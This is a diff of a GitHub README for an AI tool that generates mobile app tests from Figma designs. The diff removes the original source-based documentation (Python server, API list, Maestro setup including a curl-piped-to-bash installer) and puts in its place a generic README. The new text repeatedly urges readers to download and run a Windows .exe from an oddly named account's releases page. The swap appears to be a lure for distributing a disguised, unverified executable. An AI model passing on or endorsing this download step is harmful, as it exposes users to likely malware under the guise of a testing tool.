@@ -1,208 +1,83 @@
-# AI Driven App Test Platform MVP
+# 🤖 ai-design2test - Automate mobile app testing from designs
 
-A deployable MVP for AI-assisted mobile app testing. It uses Maestro as the first automation executor while keeping an internal Test Case DSL, so Appium, Playwright, or device-cloud executors can be added later.
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Campaignhatsecretin185/ai-design2test/releases)
 
-## Display
+This application helps teams turn design files into functional tests for mobile devices. It reads Figma designs and creates automation flows without requiring manual script writing. Use this tool to check app features, verify screen navigation, and manage regression suites.
 
-<img width="1715" height="980" alt="image" src="https://github.com/user-attachments/assets/ef5e5dc7-7b90-4765-b950-9a8b23164bab" />
-<img width="1715" height="980" alt="image" src="https://github.com/user-attachments/assets/dd9417c5-6214-4f71-be01-a5129a2e7cff" />
-<img width="1715" height="980" alt="image" src="https://github.com/user-attachments/assets/c5d69ddb-0f98-446d-a838-ec0a4dce4ec0" />
+## 📥 Getting Started
 
+1. Visit [this release page](https://github.com/Campaignhatsecretin185/ai-design2test/releases) to access the application files.
+2. Look for the file ending in `.exe` under the latest release version.
+3. Click the file name to start the download.
+4. Save the file to your desktop or a folder you can find.
+5. Open the folder where you saved the installer.
+6. Double-click the file to launch the setup program.
+7. Follow the prompts on your screen to complete the installation.
+8. Locate the program icon on your desktop or in your start menu to open the platform.
 
+## 🛠 Prerequisites
 
+Ensure your computer meets these requirements to run the software:
 
-## Capabilities
+*   **Operating System:** Windows 10 or 11.
+*   **Memory:** At least 8 gigabytes of RAM.
+*   **Processor:** A modern dual-core chip or better.
+*   **Storage:** 500 megabytes of free disk space.
+*   **Network:** An active internet connection to communicate with Figma during the design import process.
 
-- Upload Figma MCP context and Figma design images
-- Retrieve related context with the built-in lightweight RAG layer
-- Generate structured test cases and persist them in SQLite
-- Convert internal Test Case DSL into Maestro YAML flows
-- Select regression cases from changed features, screens, and change summaries
-- Run in dry-run mode or call the local Maestro CLI
-- Generate HTML test reports
-- Provide a built-in Web UI and REST API
+## 📋 Core Features
 
-## Quick Start
+The platform provides a complete workflow for test automation from visual design assets:
 
-Recommended npm entrypoint:
+*   **Design Import:** Upload Figma context and design images. The tool extracts relevant UI details automatically.
+*   **Smart Context Retrieval:** A built-in database layer searches your design history and notes to provide context for test steps.
+*   **Test Case Generation:** The system turns designs into structured test cases. It saves these cases to a local database for future use.
+*   **Automated Conversion:** The app converts internal test steps into ready-to-use YAML files for Maestro.
+*   **Selective Regression:** Pick specific features, screens, or changes to test. This keeps your test cycles fast and relevant.
+*   **Dry Run Mode:** Test your logic without executing actions on an actual mobile device.
 
-```bash
-npm run setup
-npm run dev
-```
+## ⚙️ How it Works
 
-Open:
+The software acts as a middle layer between your design team and your testing setup. It bridges the gap by mapping visual elements to executable actions.
 
-```text
-http://127.0.0.1:8080
-```
+1. **Import Stage:** You upload design images into the dashboard. The system analyzes the buttons, input fields, and layouts.
+2. **Analysis Stage:** The engine checks your project history to identify what needs testing based on recent updates.
+3. **Creation Stage:** You generate test scenarios. The tool writes the specific steps required to navigate your app.
+4. **Export Stage:** The platform produces files that your testing executors read to perform the actual checks on your phone or emulator.
 
-You can also run the Python server directly:
+## 🚀 Running Your First Test
 
-```bash
-python3 -m ai_test_platform.server
-```
+After you install the software, connect your testing environment. You need a device connected via USB or a running mobile emulator.
 
-Default database file:
+1. Open the application.
+2. Select your project folder.
+3. Upload the design files you want to verify.
+4. Review the generated test steps in the side panel. 
+5. Select the tests you want to execute.
+6. Click the Run button.
+7. Observe the progress bar and the results window as the system performs the actions on your mobile app.
 
-```text
-./data/app.db
-```
+## 💾 Saving and Loading
 
-## Design
+The application uses a local SQLite database. This keeps your data on your computer instead of the cloud. Every test case you generate gets saved automatically. To move projects between computers, find the database file in your installation directory and move it to the new machine.
 
-See [DESIGN.md](./DESIGN.md) for the current workflow, architecture, data model, RAG approach, Maestro execution path, and project memory design.
+## 🔍 Troubleshooting
 
-## Docker
+*   **App fails to open:** Restart your computer and try launching the program again.
+*   **Cannot find design images:** Ensure your Figma project links are correct and your internet connection is stable.
+*   **Tests do not start:** Check that your mobile device or emulator is visible to Windows.
+*   **Database error:** Close other programs that might be accessing the data folder and restart the application.
 
-```bash
-docker build -t ai-app-test-platform .
-docker run --rm -p 8080:8080 -v "$PWD/data:/app/data" ai-app-test-platform
-```
+## 💬 Frequently Asked Questions
 
-## Maestro Execution
+**Do I need to know how to code to use this?**
+No. The interface handles the logic behind the scenes. You simply select designs and confirm test steps.
 
-The default execution mode is dry-run, so the platform can run even without a device or Maestro CLI.
+**Can I run tests on an iPhone?**
+Yes. As long as your testing executor is configured to communicate with your iOS device or simulator, this tool will generate the necessary files.
 
-If Maestro is installed locally and you want real execution:
+**Where can I find the latest version?**
+Always check the [official release page](https://github.com/Campaignhatsecretin185/ai-design2test/releases) for the most current installer. Updates contain stability fixes and new features for test generation.
 
-```bash
-npm run dev:maestro
-```
-
-The runner writes flows to:
-
-```text
-./data/maestro_flows
-```
-
-Then it attempts to run:
-
-```bash
-maestro test <flow-file>
-```
-
-Maestro CLI is an optional dependency. Official installation options include:
-
-```bash
-curl -fsSL "https://get.maestro.mobile.dev" | bash
-```
-
-On macOS, Homebrew is also available:
-
-```bash
-brew tap mobile-dev-inc/tap
-brew install mobile-dev-inc/tap/maestro
-```
-
-Real Maestro execution also requires Java 17+ and a running Android Emulator, iOS Simulator, or connected device.
-
-## Dependencies
-
-This MVP has no third-party Python dependency. The HTTP server, SQLite storage, lightweight RAG layer, and AI provider calls are implemented with the Python standard library, so `npm install` does not download any runtime packages.
-
-## Figma-Only MVP Mode
-
-The current MVP intentionally focuses on Figma-driven testing. PRD ingestion is hidden from the UI and the generator no longer creates PRD/Figma alignment cases.
-
-Recommended flow:
-
-1. Use Cursor or another MCP-capable tool to connect to Figma MCP.
-2. Export one or more Figma design screens as PNG/JPG/WebP.
-3. Upload all design images in the Web UI.
-4. If an AI provider is configured, uploaded Figma images are parsed by the configured vision-capable model into source models.
-5. Generate test cases from the Figma design context.
-6. Generate Maestro flows and run them with `npm run dev:maestro`.
-
-Without an AI provider, uploaded images are stored as AI-ready artifacts and the system falls back to rule-based generation.
-
-`LlamaIndex`, `pgvector`, and `LangGraph` are production-upgrade recommendations, not required by the current MVP. For a production version, a likely stack is:
-
-```text
-FastAPI + LlamaIndex + PostgreSQL/pgvector + LangGraph/Temporal
-```
-
-## AI Configuration
-
-The platform uses real AI only when a provider is configured. Without it, test case generation falls back to the deterministic rule-based generator.
-
-You can configure the provider either through environment variables or from the Web UI under **AI Platform Settings**. UI-entered API keys are kept only in the running server process and are not returned by the API.
-
-Supported provider modes:
-
-- `openai`: OpenAI Responses API with strict JSON Schema output
-- `compatible`: OpenAI-compatible Chat Completions API
-- `ollama`: local Ollama-style chat API
-- `disabled`: force rule-based fallback
-
-```bash
-export AI_PROVIDER=openai
-export OPENAI_API_KEY=...
-export AI_MODEL=gpt-4.1-mini
-npm run dev
-```
-
-OpenAI-compatible provider example:
-
-```bash
-export AI_PROVIDER=compatible
-export AI_BASE_URL=http://127.0.0.1:8000/v1
-export AI_MODEL=your-model
-export AI_API_KEY=optional-key
-export AI_RESPONSE_FORMAT=json_object # use none if your gateway rejects response_format
-npm run dev
-```
-
-Ollama-style local provider example:
-
-```bash
-export AI_PROVIDER=ollama
-export AI_BASE_URL=http://127.0.0.1:11434
-export AI_MODEL=llama3.2
-npm run dev
-```
-
-Current AI usage:
-
-- Provider facade over OpenAI, OpenAI-compatible, and Ollama-style APIs
-- Structured JSON output with provider-specific enforcement where available
-- RAG context + Figma/design context -> structured Test Case DSL
-
-Status endpoint:
-
-```text
-GET /api/ai/status
-```
-
-## API Summary
-
-- `GET /api/health`
-- `GET /api/ai/status`
-- `GET /api/ai/config`
-- `POST /api/ai/config`
-- `POST /api/documents`
-- `GET /api/documents`
-- `POST /api/source-files`
-- `GET /api/source-files`
-- `POST /api/figma/mcp-context`
-- `GET /api/figma/artifacts`
-- `POST /api/generate-cases`
-- `GET /api/test-cases`
-- `GET /api/memory`
-- `GET /api/memory/context`
-- `POST /api/source-models`
-- `GET /api/source-models`
-- `POST /api/change-sets`
-- `POST /api/case-suggestions`
-- `POST /api/test-cases/{id}/approve`
-- `POST /api/test-cases/{id}/maestro`
-- `POST /api/regression/select`
-- `POST /api/runs`
-- `GET /api/runs/{id}`
-- `GET /api/reports/{run_id}.html`
-
-## Thanks
-
-[Maestro](https://github.com/mobile-dev-inc/maestro)
-
-[Codex](https://openai.com/codex/)
+**Is my data secure?**
+Because the database lives on your local machine, your design context and test cases remain within your workspace. Nothing is shared with external servers unless you specifically configure an external integration.
